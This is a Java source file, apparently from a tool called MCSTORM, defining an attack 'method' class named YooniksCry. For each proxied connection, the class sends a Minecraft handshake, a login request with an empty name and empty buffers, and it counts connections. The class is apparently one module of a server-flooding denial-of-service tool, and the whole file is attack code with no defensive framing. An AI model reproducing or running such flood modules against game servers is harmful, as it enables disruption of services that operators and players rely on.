package io.MCSTORM.methods;

import io.MCSTORM.Main;
import io.MCSTORM.utils.Handshake;
import io.MCSTORM.utils.LoginRequest;
import io.MCSTORM.utils.NettyBootstrap;
import io.MCSTORM.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class YooniksCry implements Method {
    public static String bert = "";
    private final Handshake handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
    private final byte[] bytes = this.handshake.getWrappedPacket();

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake.getWrappedPacket()));
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
        channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(bert)).getWrappedPacketC()));
        channel.writeAndFlush(b);
        channel.writeAndFlush(bbbb);
        NettyBootstrap.integer++;
        NettyBootstrap.totalConnections++;
    }
}